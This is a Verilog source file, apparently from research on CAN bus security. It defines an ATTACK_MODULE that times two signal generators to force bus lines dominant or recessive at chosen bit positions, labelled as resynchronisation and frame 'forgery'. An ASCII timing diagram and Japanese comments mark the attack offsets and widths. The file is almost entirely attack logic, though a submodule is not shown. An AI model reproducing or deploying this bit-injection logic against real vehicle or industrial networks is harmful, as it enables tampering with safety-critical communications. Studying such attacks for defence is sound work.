`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 2017/10/19 20:27:28
// Design Name: 
// Module Name: test
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////

//			   _0_     _1_     _2_     _3_     _4_     _5_     _6_     _7_     _8_     _9_     _10_    _11_    _12_    _13_    _14_    _15_
//	TBRPCLK	__|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___|   |___| 
//			   _______ __________________________________________________________________________________________________________________________        
//	tBIT(送信)|__Sync_|______＿____PropSeg____________|__________PS1__________________________|______________________________PS2______________|__
//			   _______ __________________________________________________________________________________________________________________________
//	tBIT(受信)|__Sync_|______＿____PropSeg____________|__________PS1__________________________________|______________________PS2______________|__
//			   ________________________________________________________________________________________________________________________________
//	tTQ		__|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|_______|
//			  |                                                                       |       |                                               |                 
//	CANBIT	->|<----------------------------------------------------------------------A-------A---------------------------------------------->|<----------------
//			                                               (Sample)                  送信    受信                   

module ATTACK_MODULE(CLK, RESET, ATTACK_STATE, INC_LENGTH, INC_LOC, TO_DOMINANT, TO_RECESSIVE, DEBUG);
    input CLK;  //40MHz 25ns
    input RESET;
    input ATTACK_STATE;
    input [7:0]INC_LENGTH;
    input [7:0]INC_LOC;
    inout TO_DOMINANT = 1'b1;    //1から0への電位差操作
    inout TO_RECESSIVE = 1'b1;    //0から1への電位差操作
    output DEBUG;
    
    //再同期用
    wire [7:0]rsynAttackLength = 8'd8;
    wire [15:0]rsynAttackLocation = 16'd620; //攻撃開始位置
    wire rsynAttackSig;
    //ビット改ざん用
    wire [7:0]attackLength = 8'd1 + INC_LENGTH;  //攻撃信号の幅
    wire [15:0]attackLocation = 16'd655 + 16'd17 + {8'b0,INC_LOC}; //攻撃開始位置
    wire attackSig;
    
    reg [15:0]counter;
    
    assign TO_DOMINANT = attackSig;
    assign TO_RECESSIVE = rsynAttackSig;
    
    always @(posedge CLK) begin
        if(~RESET) begin
            counter <= 0;
        end else if(ATTACK_STATE) begin
            counter <= counter + 1;
        end else begin
            counter <= 0;
        end 
    end
    
    ATTACK_SIGNAL_GENERATOR resyn(
        .CLK(CLK),
        .RESET(RESET),
        .COUNTER(counter),
        .ATTACK_LEN(rsynAttackLength),
        .ATTACK_LOC(rsynAttackLocation),
        .ATTACK_SIG(rsynAttackSig),
        .DEBUG(DEBUG)
        );
        
    ATTACK_SIGNAL_GENERATOR forgery(
        .CLK(CLK),
        .RESET(RESET),
        .COUNTER(counter),
        .ATTACK_LEN(attackLength),
        .ATTACK_LOC(attackLocation),
        .ATTACK_SIG(attackSig),
        .DEBUG()
        );
        
endmodule
